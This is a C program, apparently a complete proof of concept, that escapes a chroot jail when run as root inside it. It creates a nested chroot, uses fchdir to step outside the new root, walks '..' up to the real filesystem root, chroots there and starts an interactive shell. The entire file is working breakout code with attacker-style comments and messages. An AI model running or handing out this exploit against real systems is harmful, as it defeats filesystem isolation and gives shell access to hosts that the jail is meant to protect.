#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

#define TEMP_DIR "escape_dir"

int main() {
    printf("[*] Starting jailbreak from inside the chroot...\n");

    if (getuid() != 0) {
        fprintf(stderr, "[-] Failed: This technique requires root privileges (CAP_SYS_CHROOT) inside the jail.\n");
        return 1;
    }

    // 1. Open a file descriptor to the current directory (jail root or somewhere inside it).
    // We will need this to ensure our CWD is outside the new nested chroot.
    int dir_fd = open(".", O_RDONLY | O_DIRECTORY);
    if (dir_fd == -1) {
        perror("[-] Failed to open current directory");
        return 1;
    }

    // 2. Create a temporary directory to serve as the new, nested chroot.
    if (mkdir(TEMP_DIR, 0755) == -1) {
        if (errno != EEXIST) {
             perror("[-] Failed to create temporary directory");
             return 1;
        }
    }
    printf("[+] Created (or found) nested jail directory: %s\n", TEMP_DIR);

    // 3. chroot into this new directory. 
    // CRITICAL: This changes the process's root, BUT NOT its current working directory (CWD).
    // Our CWD is currently still in the *parent* of this new chroot.
    if (chroot(TEMP_DIR) == -1) {
        perror("[-] Failed to chroot into temporary directory");
        return 1;
    }
    printf("[+] chroot(\"%s\") successful. We are now in a nested jail.\n", TEMP_DIR);

    // 4. Use fchdir to ensure we are at the old CWD, which is now effectively 
    // *outside* our current root.
    if (fchdir(dir_fd) == -1) {
        perror("[-] Failed to fchdir back to original directory");
        return 1;
    }
    close(dir_fd);

    // 5. Traverse UP the filesystem.
    // Since our CWD is outside our current root, standard '..' traversal applies 
    // and is not stopped by the chroot barrier.
    printf("[*] Traversing '..' up to the real root...\n");
    for (int i = 0; i < 1024; i++) {
        if (chdir("..") == -1) {
             // Might happen if we hit a permissions issue, but unlikely for root
        }
    }

    // 6. We should now be at the real filesystem root. 
    // Call chroot(".") to lock our new root here.
    if (chroot(".") == -1) {
        perror("[-] Failed to finalize escape with chroot(.)");
        return 1;
    }
    printf("[+] Escape complete! Filesystem root reset to real root.\n");

    // 7. Verify by spawning a shell or listing /
    printf("[*] Spawning a shell in the real environment...\n\n");
    execl("/bin/sh", "sh", "-i", NULL);

    // If execl fails:
    perror("[-] Failed to exec /bin/sh");
    return 1;
}
